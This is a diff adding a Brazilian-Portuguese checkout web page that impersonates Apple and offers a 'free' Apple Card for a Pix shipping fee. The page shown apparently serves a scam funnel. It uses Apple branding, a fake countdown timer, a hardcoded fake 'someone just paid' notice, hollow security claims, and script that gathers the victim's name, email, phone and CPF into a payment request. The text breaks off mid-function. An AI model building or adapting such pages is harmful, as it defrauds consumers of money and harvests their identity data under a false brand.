@@ -1,0 +1,1268 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Checkout — Apple Card</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+
+    <!-- Facebook Pixel Code -->
+    <script>
+    !function(f,b,e,v,n,t,s)
+    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)}(window, document,'script',
+    'https://connect.facebook.net/en_US/fbevents.js');
+
+    // ⚠️ SUBSTITUA pelo seu Pixel ID real
+    var FB_PIXEL_ID = '1460908116098693';
+    fbq('init', FB_PIXEL_ID);
+    fbq('track', 'PageView');
+    </script>
+    <noscript>
+      <img height="1" width="1" style="display:none"
+           src="https://www.facebook.com/tr?id=123456789012345&ev=PageView&noscript=1"/>
+    </noscript>
+    <!-- End Facebook Pixel Code -->
+
+    <style>
+        *,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+        :root{
+            --apple-black:#1D1D1F;--apple-blue:#0071E3;
+            --gray-100:#F5F5F7;--gray-200:#E8E8ED;--gray-300:#D2D2D7;
+            --gray-400:#86868B;--gray-500:#6E6E73;
+            --success:#34C759;--warning:#FF9F0A;--error:#FF3B30;
+            --surface:#FFFFFF;--pix-green:#32BCAD;
+        }
+        body{font-family:-apple-system,BlinkMacSystemFont,'Inter',sans-serif;background:var(--gray-100);color:var(--apple-black);-webkit-font-smoothing:antialiased;min-height:100vh}
+        .page{max-width:520px;margin:0 auto;min-height:100vh;background:var(--surface)}
+        .nav{display:flex;align-items:center;padding:14px 20px;border-bottom:0.5px solid var(--gray-200);background:rgba(255,255,255,0.92);backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);position:sticky;top:0;z-index:100}
+        .nav-back{width:32px;height:32px;display:flex;align-items:center;justify-content:center;border:none;background:var(--gray-100);border-radius:50%;cursor:pointer;transition:all 0.2s}
+        .nav-back:active{transform:scale(0.92)}
+        .nav-back svg{width:14px;height:14px;fill:var(--apple-black)}
+        .nav-title{flex:1;text-align:center;font-size:0.9375rem;font-weight:600}
+        .nav-secure{display:flex;align-items:center;gap:4px;font-size:0.6875rem;color:var(--success)}
+        .nav-secure svg{width:12px;height:12px;fill:var(--success)}
+        .progress{height:3px;background:var(--gray-200)}
+        .progress-bar{height:100%;background:var(--success);border-radius:2px;width:100%}
+        .content{padding:24px 20px}
+        .timer-banner{display:flex;align-items:center;gap:10px;padding:12px 14px;background:rgba(255,59,48,0.06);border:1px solid rgba(255,59,48,0.12);border-radius:12px;margin-bottom:20px}
+        .timer-icon{width:36px;height:36px;border-radius:10px;background:rgba(255,59,48,0.12);display:flex;align-items:center;justify-content:center;flex-shrink:0}
+        .timer-icon svg{width:18px;height:18px;fill:var(--error)}
+        .timer-text{flex:1}
+        .timer-text .tt-title{font-size:0.8125rem;font-weight:600;color:var(--error)}
+        .timer-text .tt-desc{font-size:0.6875rem;color:var(--gray-500)}
+        .timer-countdown{font-size:1.125rem;font-weight:800;color:var(--error);font-variant-numeric:tabular-nums}
+        .order-card{background:var(--gray-100);border-radius:14px;padding:16px;margin-bottom:20px}
+        .order-card .oc-title{font-size:0.75rem;font-weight:600;color:var(--gray-500);text-transform:uppercase;letter-spacing:0.06em;margin-bottom:12px}
+        .oc-item{display:flex;align-items:center;gap:12px;margin-bottom:12px}
+        .oc-img{width:48px;height:30px;border-radius:6px;position:relative;overflow:hidden;flex-shrink:0}
+        .oc-img .bg{position:absolute;inset:0}
+        .oc-info{flex:1}
+        .oc-name{font-size:0.875rem;font-weight:600}
+        .oc-desc{font-size:0.6875rem;color:var(--gray-500)}
+        .oc-divider{height:1px;background:var(--gray-200);margin:12px 0}
+        .oc-row{display:flex;justify-content:space-between;padding:4px 0;font-size:0.8125rem}
+        .oc-row .label{color:var(--gray-500)}
+        .oc-row .value{font-weight:600}
+        .oc-total{display:flex;justify-content:space-between;padding:8px 0 0;font-size:1rem;font-weight:700;border-top:1px solid var(--gray-200);margin-top:8px}
+        .pix-section{margin-bottom:20px}
+        .pix-method{display:flex;align-items:center;gap:12px;padding:14px 16px;border:2px solid var(--pix-green);border-radius:14px;background:rgba(50,188,173,0.04);margin-bottom:16px;position:relative}
+        .pix-method::after{content:'';position:absolute;top:12px;right:16px;width:20px;height:20px;border-radius:50%;background:var(--pix-green);background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='white'%3E%3Cpath d='M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z'/%3E%3C/svg%3E");background-size:14px;background-position:center;background-repeat:no-repeat}
+        .pix-logo{width:40px;height:40px;border-radius:10px;overflow:hidden;flex-shrink:0;background:#32BCAD;display:flex;align-items:center;justify-content:center}
+        .pix-logo svg{width:24px;height:24px;fill:#fff}
+        .pix-method-info{flex:1}
+        .pix-method-title{font-size:0.9375rem;font-weight:700}
+        .pix-method-desc{font-size:0.75rem;color:var(--gray-500)}
+        .pix-discount{display:inline-block;padding:2px 8px;background:rgba(50,188,173,0.12);color:var(--pix-green);font-size:0.6875rem;font-weight:700;border-radius:6px;margin-top:4px}
+        .pay-btn{display:block;width:100%;padding:18px;border:none;border-radius:14px;font-size:1.0625rem;font-weight:700;cursor:pointer;font-family:inherit;background:var(--apple-black);color:#fff;text-align:center;transition:all 0.3s ease;margin-bottom:12px;position:relative;overflow:hidden}
+        .pay-btn:hover{opacity:0.9}
+        .pay-btn:active{transform:scale(0.98)}
+        .pay-btn:disabled{opacity:0.5;cursor:not-allowed;transform:none}
+        .pay-btn .shine{position:absolute;top:0;left:-100%;width:100%;height:100%;background:linear-gradient(90deg,transparent,rgba(255,255,255,0.08),transparent);animation:btnShine 3s ease infinite}
+        .pay-btn-label{display:flex;align-items:center;justify-content:center;gap:8px;position:relative;z-index:2}
+        .pay-btn.loading .pay-btn-label{opacity:0}
+        .pay-btn.loading .shine{display:none}
+        .pay-btn.loading::after{content:'';position:absolute;top:50%;left:50%;width:24px;height:24px;margin:-12px 0 0 -12px;border:3px solid rgba(255,255,255,0.3);border-top-color:#fff;border-radius:50%;animation:spin 0.8s linear infinite}
+        .pix-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.5);backdrop-filter:blur(8px);-webkit-backdrop-filter:blur(8px);z-index:999;opacity:0;visibility:hidden;transition:all 0.3s ease;display:flex;align-items:flex-end;justify-content:center}
+        .pix-overlay.active{opacity:1;visibility:visible}
+        .pix-modal{background:var(--surface);border-radius:20px 20px 0 0;width:100%;max-width:520px;max-height:92vh;overflow-y:auto;padding:0;transform:translateY(100%);transition:transform 0.4s cubic-bezier(0.32,0.72,0,1)}
+        .pix-overlay.active .pix-modal{transform:translateY(0)}
+        .pix-modal-handle{width:36px;height:4px;background:var(--gray-300);border-radius:2px;margin:10px auto 0}
+        .pix-modal-header{padding:16px 20px;display:flex;align-items:center;justify-content:space-between;border-bottom:0.5px solid var(--gray-200)}
+        .pix-modal-header h3{font-size:1rem;font-weight:700}
+        .pix-modal-close{width:28px;height:28px;border-radius:50%;background:var(--gray-100);border:none;cursor:pointer;display:flex;align-items:center;justify-content:center}
+        .pix-modal-close svg{width:14px;height:14px;fill:var(--gray-500)}
+        .pix-modal-body{padding:20px}
+        .pix-timer-bar{display:flex;align-items:center;gap:8px;padding:10px 14px;background:rgba(255,149,10,0.08);border-radius:10px;margin-bottom:20px;font-size:0.8125rem}
+        .pix-timer-bar svg{width:16px;height:16px;fill:var(--warning);flex-shrink:0}
+        .pix-timer-bar .ptb-text{flex:1;color:var(--gray-500)}
+        .pix-timer-bar .ptb-time{font-weight:700;color:var(--warning);font-variant-numeric:tabular-nums}
+        .qr-container{display:flex;flex-direction:column;align-items:center;margin-bottom:20px}
+        .qr-wrapper{position:relative;width:220px;height:220px;padding:12px;background:#fff;border-radius:16px;border:2px solid var(--gray-200);margin-bottom:12px}
+        .qr-wrapper img{width:100%;height:100%;object-fit:contain;border-radius:8px}
+        .qr-wrapper .qr-apple-logo{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:44px;height:44px;background:#fff;border-radius:10px;display:flex;align-items:center;justify-content:center;box-shadow:0 2px 8px rgba(0,0,0,0.1);font-size:22px}
+        .qr-label{font-size:0.75rem;color:var(--gray-500);text-align:center}
+        .copy-section{margin-bottom:20px}
+        .copy-section label{display:block;font-size:0.75rem;font-weight:600;color:var(--gray-500);text-transform:uppercase;letter-spacing:0.06em;margin-bottom:8px}
+        .copy-box{display:flex;gap:8px}
+        .copy-input{flex:1;padding:12px 14px;background:var(--gray-100);border:1.5px solid var(--gray-200);border-radius:10px;font-family:'Courier New',monospace;font-size:0.7rem;color:var(--apple-black);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;outline:none;cursor:text}
+        .copy-btn{padding:12px 20px;background:var(--apple-black);color:#fff;border:none;border-radius:10px;font-size:0.8125rem;font-weight:600;cursor:pointer;font-family:inherit;white-space:nowrap;transition:all 0.2s}
+        .copy-btn:active{transform:scale(0.96)}
+        .copy-btn.copied{background:var(--success)}
+        .pix-steps{margin-bottom:20px;padding:16px;background:var(--gray-100);border-radius:14px}
+        .pix-steps-title{font-size:0.8125rem;font-weight:600;margin-bottom:12px}
+        .pix-step{display:flex;gap:10px;margin-bottom:10px;font-size:0.8125rem;color:var(--gray-500);line-height:1.4}
+        .pix-step:last-child{margin-bottom:0}
+        .pix-step-num{width:22px;height:22px;border-radius:50%;background:var(--apple-black);color:#fff;font-size:0.6875rem;font-weight:700;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+        .pix-status{text-align:center;padding:16px;background:rgba(255,149,10,0.06);border-radius:14px;margin-bottom:16px;transition:all 0.4s ease}
+        .pix-status .ps-icon{width:48px;height:48px;border-radius:50%;margin:0 auto 8px;display:flex;align-items:center;justify-content:center}
+        .pix-status .ps-icon.waiting{background:rgba(255,149,10,0.12)}
+        .pix-status .ps-icon.waiting svg{fill:var(--warning)}
+        .pix-status .ps-icon.paid{background:rgba(52,199,89,0.12)}
+        .pix-status .ps-icon.paid svg{fill:var(--success)}
+        .pix-status .ps-icon svg{width:24px;height:24px}
+        .pix-status .ps-title{font-size:0.9375rem;font-weight:700;margin-bottom:2px}
+        .pix-status .ps-desc{font-size:0.75rem;color:var(--gray-500)}
+        .pix-status-dot{display:inline-block;width:6px;height:6px;border-radius:50%;margin-right:4px;vertical-align:middle}
+        .pix-status-dot.waiting{background:var(--warning);animation:livePulse 1.5s ease infinite}
+        .pix-status-dot.paid{background:var(--success)}
+        .live-proof{padding:10px 14px;background:rgba(52,199,89,0.06);border-radius:10px;margin-bottom:16px;display:flex;align-items:center;gap:8px;font-size:0.75rem;overflow:hidden;height:42px;position:relative}
+        .live-dot{width:6px;height:6px;border-radius:50%;background:var(--success);flex-shrink:0;animation:livePulse 2s ease infinite}
+        .live-text{flex:1;color:var(--gray-500);transition:opacity 0.3s}
+        .live-text strong{color:var(--success)}
+        .faq{margin-bottom:20px}
+        .faq-title{font-size:0.875rem;font-weight:600;margin-bottom:10px}
+        .faq-item{border:1px solid var(--gray-200);border-radius:12px;margin-bottom:8px;overflow:hidden}
+        .faq-q{padding:12px 14px;font-size:0.8125rem;font-weight:600;cursor:pointer;display:flex;align-items:center;justify-content:space-between;background:var(--surface)}
+        .faq-q svg{width:16px;height:16px;fill:var(--gray-400);transition:transform 0.3s}
+        .faq-item.open .faq-q svg{transform:rotate(180deg)}
+        .faq-a{padding:0 14px;max-height:0;overflow:hidden;transition:all 0.3s ease;font-size:0.8125rem;color:var(--gray-500);line-height:1.5}
+        .faq-item.open .faq-a{padding:0 14px 12px;max-height:200px}
+        .guarantees{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-bottom:20px}
+        .guarantee{text-align:center;padding:12px 8px;background:var(--gray-100);border-radius:12px}
+        .guarantee svg{width:22px;height:22px;fill:var(--gray-500);display:block;margin:0 auto 4px}
+        .guarantee span{font-size:0.5625rem;color:var(--gray-500);font-weight:500;line-height:1.3;display:block}
+        .test-banner{display:none;padding:10px 14px;background:rgba(0,113,227,0.08);border:1px solid rgba(0,113,227,0.2);border-radius:10px;margin-bottom:16px;font-size:0.75rem;color:var(--apple-blue);text-align:center;font-weight:600}
+        .test-banner.active{display:block}
+        @keyframes btnShine{0%{left:-100%}50%{left:100%}100%{left:100%}}
+        @keyframes livePulse{0%,100%{opacity:1}50%{opacity:0.3}}
+        @keyframes spin{to{transform:rotate(360deg)}}
+        @keyframes fadeIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
+        .fade-in{animation:fadeIn 0.4s ease both}
+    </style>
+</head>
+<body>
+    <div class="page">
+        <div class="nav">
+            <button class="nav-back" onclick="history.back()"><svg viewBox="0 0 24 24"><path d="M15.41 7.41L14 6l-6 6 6 6 1.41-1.41L10.83 12z"></path></svg></button>
+            <div class="nav-title">Checkout</div>
+            <div class="nav-secure"><svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zM9 8V6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9z"></path></svg> Seguro</div>
+        </div>
+        <div class="progress"><div class="progress-bar"></div></div>
+        <div class="content" id="checkoutView">
+            <div class="test-banner" id="testBanner">🧪 MODO TESTE — Valor reduzido para R$ 2,00</div>
+            <div class="timer-banner">
+                <div class="timer-icon"><svg viewBox="0 0 24 24"><path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67z"></path></svg></div>
+                <div class="timer-text">
+                    <div class="tt-title">Oferta limitada por tempo</div>
+                    <div class="tt-desc">Finalize antes que expire</div>
+                </div>
+                <div class="timer-countdown" id="timer">15:00</div>
+            </div>
+            <div class="order-card">
+                <div class="oc-title">Resumo do Pedido</div>
+                <div class="oc-item">
+                    <div class="oc-img"><div class="bg" id="orderCardBg" style="background: linear-gradient(145deg, rgb(227, 227, 232), rgb(200, 200, 205), rgb(232, 232, 237));"></div></div>
+                    <div class="oc-info">
+                        <div class="oc-name">Apple Card <span id="orderColor">Titanium</span></div>
+                        <div class="oc-desc">Cartão de titânio • VISA</div>
+                    </div>
+                </div>
+                <div class="oc-divider"></div>
+                <div class="oc-row"><span class="label">Cartão Apple Card</span><span class="value" style="color:var(--success)">Grátis</span></div>
+                <div class="oc-row"><span class="label">Anuidade</span><span class="value" style="color:var(--success)">R$ 0,00</span></div>
+                <div class="oc-row"><span class="label">Taxa de envio (<span id="orderTipo">Expresso</span>)</span><span class="value" id="orderFrete">R$ 24,90</span></div>
+                <div class="oc-total"><span>Total</span><span id="orderTotal">R$ 24,90</span></div>
+            </div>
+            <div class="pix-section">
+                <div class="pix-method">
+                    <div class="pix-logo">
+                        <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 15l-5-5 1.41-1.41L11 14.17l7.59-7.59L20 8l-9 9z"/></svg>
+                    </div>
+                    <div class="pix-method-info">
+                        <div class="pix-method-title">Pagar com Pix</div>
+                        <div class="pix-method-desc">Aprovação instantânea</div>
+                        <div class="pix-discount">Pagamento único</div>
+                    </div>
+                </div>
+            </div>
+            <button class="pay-btn" id="payBtn" onclick="generatePix()">
+                <div class="shine"></div>
+                <div class="pay-btn-label">
+                    <span>Pagar com Pix — <span id="payPrice">R$ 24,90</span></span>
+                </div>
+            </button>
+            <div class="live-proof" id="liveProof">
+                <div class="live-dot"></div>
+                <div class="live-text" id="liveText"><strong>Maria S.</strong> de São Paulo finalizou o pagamento agora</div>
+            </div>
+            <div class="faq">
+                <div class="faq-title">Perguntas frequentes</div>
+                <div class="faq-item">
+                    <div class="faq-q" onclick="toggleFaq(this)">Por que pago apenas o frete?<svg viewBox="0 0 24 24"><path d="M7.41 8.59L12 13.17l4.59-4.58L18 10l-6 6-6-6z"></path></svg></div>
+                    <div class="faq-a">O Apple Card é 100% gratuito, sem anuidade. Você paga apenas o custo de envio do cartão físico de titânio até seu endereço.</div>
+                </div>
+                <div class="faq-item">
+                    <div class="faq-q" onclick="toggleFaq(this)">Quando vou receber meu cartão?<svg viewBox="0 0 24 24"><path d="M7.41 8.59L12 13.17l4.59-4.58L18 10l-6 6-6-6z"></path></svg></div>
+                    <div class="faq-a">Econômico (12-18 dias), Expresso (5-8 dias) ou Premium (2-4 dias). Você recebe o código de rastreamento por e-mail e WhatsApp.</div>
+                </div>
+                <div class="faq-item">
+                    <div class="faq-q" onclick="toggleFaq(this)">O pagamento Pix é seguro?<svg viewBox="0 0 24 24"><path d="M7.41 8.59L12 13.17l4.59-4.58L18 10l-6 6-6-6z"></path></svg></div>
+                    <div class="faq-a">Sim! O Pix é regulamentado pelo Banco Central. Utilizamos criptografia SSL de 256 bits.</div>
+                </div>
+                <div class="faq-item">
+                    <div class="faq-q" onclick="toggleFaq(this)">Posso cancelar o pedido?<svg viewBox="0 0 24 24"><path d="M7.41 8.59L12 13.17l4.59-4.58L18 10l-6 6-6-6z"></path></svg></div>
+                    <div class="faq-a">Você pode solicitar o cancelamento em até 7 dias após o pagamento, com reembolso integral.</div>
+                </div>
+            </div>
+            <div class="guarantees">
+                <div class="guarantee">
+                    <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"></path></svg>
+                    <span>Pagamento<br>100% seguro</span>
+                </div>
+                <div class="guarantee">
+                    <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zM9 8V6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9z"></path></svg>
+                    <span>Dados<br>protegidos</span>
+                </div>
+                <div class="guarantee">
+                    <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"></path></svg>
+                    <span>Garantia de<br>7 dias</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- PIX Modal -->
+    <div class="pix-overlay" id="pixOverlay">
+        <div class="pix-modal">
+            <div class="pix-modal-handle"></div>
+            <div class="pix-modal-header">
+                <h3>Pagamento Pix</h3>
+                <button class="pix-modal-close" onclick="closePixModal()"><svg viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"></path></svg></button>
+            </div>
+            <div class="pix-modal-body">
+                <div class="pix-timer-bar">
+                    <svg viewBox="0 0 24 24"><path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67z"></path></svg>
+                    <span class="ptb-text">O Pix expira em</span>
+                    <span class="ptb-time" id="pixTimer">29:59</span>
+                </div>
+                <div class="pix-status" id="pixStatus">
+                    <div class="ps-icon waiting" id="pixStatusIcon">
+                        <svg viewBox="0 0 24 24"><path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67z"></path></svg>
+                    </div>
+                    <div class="ps-title"><span class="pix-status-dot waiting" id="pixStatusDot"></span> <span id="pixStatusText">Aguardando pagamento...</span></div>
+                    <div class="ps-desc" id="pixStatusDesc">Escaneie o QR Code ou copie o código</div>
+                </div>
+                <div class="qr-container fade-in">
+                    <div class="qr-wrapper">
+                        <img id="pixQrImage" src="" alt="QR Code Pix">
+                        <div class="qr-apple-logo"></div>
+                    </div>
+                    <div class="qr-label">Escaneie com o app do seu banco</div>
+                </div>
+                <div class="copy-section fade-in">
+                    <label>Pix Copia e Cola</label>
+                    <div class="copy-box">
+                        <input type="text" class="copy-input" id="pixCopyPaste" readonly value="">
+                        <button class="copy-btn" id="copyBtn" onclick="copyPixCode()">Copiar</button>
+                    </div>
+                </div>
+                <div class="pix-steps fade-in">
+                    <div class="pix-steps-title">Como pagar:</div>
+                    <div class="pix-step"><div class="pix-step-num">1</div><span>Abra o app do seu banco ou carteira digital</span></div>
+                    <div class="pix-step"><div class="pix-step-num">2</div><span>Escolha pagar com Pix e escaneie o QR Code ou cole o código</span></div>
+                    <div class="pix-step"><div class="pix-step-num">3</div><span>Confirme o pagamento. A aprovação é instantânea!</span></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+
+<script>
+(function () {
+    'use strict';
+
+    // ─── HELPERS ───
+
+    const $ = (id) => document.getElementById(id);
+
+    function setText(id, value) {
+        const el = $(id);
+        if (el) el.textContent = value;
+    }
+
+    function setClass(id, className) {
+        const el = $(id);
+        if (el) el.className = className;
+    }
+
+    function safeStorage(storage, action, key, value) {
+        try {
+            if (action === 'get') return storage.getItem(key);
+            if (action === 'set') storage.setItem(key, value);
+        } catch (e) {
+            console.warn('[Storage]', e);
+        }
+        return null;
+    }
+
+    // ─── UTM ───
+
+    const utmKeys = [
+        'utm_source',
+        'utm_medium',
+        'utm_campaign',
+        'utm_content',
+        'utm_term',
+        'src',
+        'sck'
+    ];
+
+    const params = new URLSearchParams(window.location.search);
+
+    utmKeys.forEach(function (key) {
+        const value = params.get(key);
+
+        if (value) {
+            safeStorage(localStorage, 'set', key, value);
+        }
+    });
+
+    // ─── LEAD DATA ───
+
+    const LeadData = {
+        _key: 'applecard_lead',
+
+        load() {
+            try {
+                const raw = safeStorage(
+                    localStorage,
+                    'get',
+                    this._key
+                );
+
+                const parsed = JSON.parse(raw || '{}');
+
+                return parsed && typeof parsed === 'object'
+                    ? parsed
+                    : {};
+            } catch (e) {
+                console.warn('[LeadData] Erro ao carregar:', e);
+                return {};
+            }
+        },
+
+        update(newData) {
+            const current = this.load();
+
+            const updated = {
+                ...current,
+                ...newData,
+                updated_at: Date.now()
+            };
+
+            safeStorage(
+                localStorage,
+                'set',
+                this._key,
+                JSON.stringify(updated)
+            );
+
+            return updated;
+        }
+    };
+
+    LeadData.update({ page: 'checkout' });
+
+    const data = LeadData.load();
+
+    // ─── CONFIGURAÇÕES ───
+
+    const isTestMode =
+        params.get('test') === '1' ||
+        params.get('modo') === 'teste';
+
+    const configuredFrete = Number(
+        data.frete_valor ??
+        params.get('frete') ??
+        24.90
+    );
+
+    let frete =
+        Number.isFinite(configuredFrete) &&
+        configuredFrete > 0
+            ? configuredFrete
+            : 24.90;
+
+    const tipo =
+        data.frete_tipo ||
+        params.get('tipo') ||
+        'expresso';
+
+    const corCartao =
+        data.cartao_cor ||
+        params.get('cor') ||
+        'silver';
+
+    const corLabel =
+        data.cartao_cor_label ||
+        ({
+            silver: 'Titanium',
+            black: 'Black',
+            gold: 'Gold'
+        }[corCartao] || 'Titanium');
+
+    if (isTestMode) {
+        frete = 2.00;
+
+        const banner = $('testBanner');
+
+        if (banner) {
+            banner.classList.add('active');
+        }
+    }
+
+    const amountCents = Math.round(frete * 100);
+    const amountReais = frete;
+
+    const colorMap = {
+        silver:
+            'linear-gradient(145deg, #E3E3E8, #C8C8CD, #E8E8ED)',
+        black:
+            'linear-gradient(145deg, #2C2C2E, #1A1A1C, #3A3A3C)',
+        gold:
+            'linear-gradient(145deg, #F5E6CC, #D4C4A0, #F0DCC0)'
+    };
+
+    const tipoLabels = {
+        economico: 'Econômico',
+        expresso: 'Expresso',
+        premium: 'Premium'
+    };
+
+    function formatBRL(value) {
+        return new Intl.NumberFormat('pt-BR', {
+            style: 'currency',
+            currency: 'BRL'
+        }).format(value);
+    }
+
+    // ─── ATUALIZAR INTERFACE ───
+
+    const orderCardBg = $('orderCardBg');
+
+    if (orderCardBg) {
+        orderCardBg.style.background =
+            colorMap[corCartao] || colorMap.silver;
+    }
+
+    setText('orderColor', corLabel);
+
+    setText(
+        'orderTipo',
+        tipoLabels[tipo] || 'Expresso'
+    );
+
+    setText('orderFrete', formatBRL(frete));
+    setText('orderTotal', formatBRL(frete));
+    setText('payPrice', formatBRL(frete));
+
+    // ─── FACEBOOK PIXEL ───
+
+    function trackInitiateCheckout() {
+        if (typeof window.fbq !== 'function') {
+            return;
+        }
+
+        window.fbq('track', 'InitiateCheckout', {
+            value: amountReais,
+            currency: 'BRL',
+            content_name:
+                'Apple Card - Envio ' +
+                (tipoLabels[tipo] || 'Expresso'),
+            content_type: 'product',
+            num_items: 1
+        });
+
+        console.log(
+            '[FB Pixel] InitiateCheckout',
+            amountReais
+        );
+    }
+
+    function trackPurchase(transactionId) {
+        if (typeof window.fbq !== 'function') {
+            return;
+        }
+
+        if (!transactionId) {
+            console.warn(
+                '[FB Pixel] Purchase sem transactionId'
+            );
+            return;
+        }
+
+        const key = 'fb_purchase_' + transactionId;
+
+        if (
+            safeStorage(sessionStorage, 'get', key)
+        ) {
+            return;
+        }
+
+        window.fbq('track', 'Purchase', {
+            value: amountReais,
+            currency: 'BRL',
+            content_name:
+                'Apple Card - Envio ' +
+                (tipoLabels[tipo] || 'Expresso'),
+            content_type: 'product',
+            content_ids: [transactionId],
+            num_items: 1
+        });
+
+        safeStorage(
+            sessionStorage,
+            'set',
+            key,
+            '1'
+        );
+
+        console.log(
+            '[FB Pixel] Purchase',
+            transactionId
+        );
+    }
+
+    // ─── TIMER PRINCIPAL ───
+
+    let totalSeconds = 15 * 60;
+    let mainTimerTimeout = null;
+
+    function updateTimer() {
+        const timer = $('timer');
+
+        if (!timer) return;
+
+        const minutes = Math.floor(totalSeconds / 60);
+        const seconds = totalSeconds % 60;
+
+        timer.textContent =
+            String(minutes).padStart(2, '0') +
+            ':' +
+            String(seconds).padStart(2, '0');
+
+        if (totalSeconds > 0) {
+            totalSeconds--;
+
+            mainTimerTimeout = setTimeout(
+                updateTimer,
+                1000
+            );
+        } else {
+            timer.textContent = 'EXPIRADO';
+        }
+    }
+
+    if ($('timer')) {
+        updateTimer();
+    }
+
+    // ─── FAQ ───
+
+    window.toggleFaq = function (element) {
+        if (!element || !element.parentElement) {
+            return;
+        }
+
+        element.parentElement.classList.toggle('open');
+    };
+
+    // ─── SOCIAL PROOF ───
+    // Exibir apenas eventos reais recebidos do servidor.
+    // Nenhuma compra fictícia é anunciada.
+
+    // ─── PIX ───
+
+    let currentTransactionId = null;
+    let currentReference = null;
+
+    let statusCheckInterval = null;
+    let statusCheckTimeout = null;
+    let pixTimerInterval = null;
+
+    let pixTimerSeconds = 30 * 60;
+    let checkingStatus = false;
+    let paymentApproved = false;
+    let generatingPix = false;
+
+    // ─── JSON SEGURO ───
+
+    async function parseApiResponse(response) {
+        const raw = await response.text();
+
+        console.log(
+            '[API] HTTP:',
+            response.status
+        );
+
+        if (!raw || !raw.trim()) {
+            throw new Error(
+                'O servidor retornou uma resposta vazia ' +
+                '(HTTP ' + response.status + ')'
+            );
+        }
+
+        let result;
+
+        try {
+            result = JSON.parse(raw);
+        } catch (error) {
+            console.error(
+                '[API] Resposta inválida:',
+                raw.substring(0, 500)
+            );
+
+            throw new Error(
+                'O servidor não retornou JSON válido ' +
+                '(HTTP ' + response.status + ')'
+            );
+        }
+
+        if (!result || typeof result !== 'object') {
+            throw new Error(
+                'Formato de resposta inválido'
+            );
+        }
+
+        if (!response.ok) {
+            throw new Error(
+                result.error ||
+                result.message ||
+                'Erro HTTP ' + response.status
+            );
+        }
+
+        return result;
+    }
+
+    // ─── GERAR PIX ───
+
+    window.generatePix = async function () {
+        if (generatingPix || paymentApproved) {
+            return;
+        }
+
+        const btn = $('payBtn');
+
+        generatingPix = true;
+
+        if (btn) {
+            btn.classList.add('loading');
+            btn.disabled = true;
+        }
+
+        const utm = {};
+
+        utmKeys.forEach(function (key) {
+            const value =
+                safeStorage(localStorage, 'get', key) ||
+                params.get(key);
+
+            if (value) {
+                utm[key] = value;
+            }
+        });
+
+        const payload = {
+            amount: amountCents,
+
+            payerName:
+                data.nome ||
+                data.name ||
+                params.get('nome') ||
+                'Cliente',
+
+            email:
+                data.email ||
+                params.get('email') ||
+                '',
+
+            phone:
+                data.telefone ||
+                data.phone ||
+                params.get('phone') ||
+                '',
+
+            document:
+                data.cpf ||
+                data.document ||
+                params.get('cpf') ||
+                '',
+
+            productName:
+                'Apple Card - Envio ' +
+                (tipoLabels[tipo] || 'Expresso'),
+
+            utm: utm
+        };
+
+        try {
